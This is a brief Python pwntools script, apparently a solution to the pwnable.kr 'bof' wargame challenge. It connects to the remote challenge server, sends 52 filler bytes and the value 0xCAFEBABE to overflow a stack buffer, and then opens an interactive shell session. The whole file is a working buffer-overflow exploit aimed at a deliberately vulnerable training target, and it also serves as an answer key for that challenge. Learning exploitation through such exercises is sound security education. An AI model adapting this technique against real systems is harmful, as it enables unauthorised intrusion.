from pwn import *
context.log_level='debug'
#p = process('./bof')
p=remote("pwnable.kr",9000)
#print p.recvline()
payload=b'a'*52
payload+=p32(0xCAFEBABE)
p.sendline(payload)

p.interactive()
